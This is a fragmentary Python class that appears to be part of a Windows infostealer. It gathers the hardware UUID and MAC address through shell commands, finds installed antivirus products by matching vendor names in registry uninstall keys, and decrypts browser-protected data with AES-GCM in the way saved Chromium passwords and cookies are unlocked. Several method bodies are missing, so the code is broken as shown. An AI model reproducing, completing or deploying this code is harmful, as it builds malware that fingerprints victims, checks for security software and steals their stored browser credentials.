    def get_public_ip(self):

    def get_hwid(self):
        try:
            cmd = 'wmic csproduct get uuid'
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
            return result.split('\n')[1].strip()
        except:
            return "N/A"

    def get_mac_address(self):
        try:
            mac = subprocess.check_output('getmac /fo csv /nh', shell=True, stderr=subprocess.DEVNULL).decode()
            return mac.split(',')[0].strip('"')
        except:
            return "N/A"

    def get_disk_usage(self):

        except:
            return "N/A"

    def get_antivirus(self):

                av_list.append("Windows Defender")
            av_paths = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            ]
            av_keywords = ["norton", "mcafee", "kaspersky", "avast", "bitdefender", "avg", "eset", "sophos", "trend micro"]
            for path in av_paths:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_READ) as key:
                        i = 0
                        while True:
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    try:

    def decrypt_browser_data(self, data, key):
        """Decrypt browser-encrypted data using AES-GCM"""
        try:
            if len(data) < 15:
                return None
            iv = data[3:15]
            payload = data[15:-16] if len(data) > 15 else data[15:]
            if len(payload) == 0:
                return None
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None
